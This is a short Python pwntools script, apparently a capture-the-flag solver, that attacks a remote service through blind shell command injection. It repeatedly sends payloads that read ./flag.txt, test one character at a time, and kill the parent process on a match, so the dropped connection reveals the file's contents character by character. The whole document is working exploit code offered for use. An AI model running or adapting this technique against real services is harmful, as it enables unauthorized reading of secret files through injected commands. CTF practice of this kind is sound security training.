from pwn import *
import string
import sys

HOST = sys.argv[1]
PORT = sys.argv[2]

charset = string.printable
flag = ""

for i in range(1, 100):
    for char in charset:
        try:
            conn = remote(HOST, PORT)

            payload = f'file_content=$(cat ./flag.txt); char_to_check=$(head -c{i} ./flag.txt | tail -c1); correct_char="{char}"; [ "$char_to_check" = "$correct_char" ] && kill -9 $PPID\n'

            conn.sendline(payload)

            response = conn.recv(timeout=0.2)  # Adjust timeout if needed

            print(f"Checked position {i}: {char} -> Process NOT killed")

            conn.close()

        except EOFError:
            flag += char
            print(f"FLAG PROGRESS: {flag}")

            break

    else:
        print(f"Full flag found: {flag}")
        break
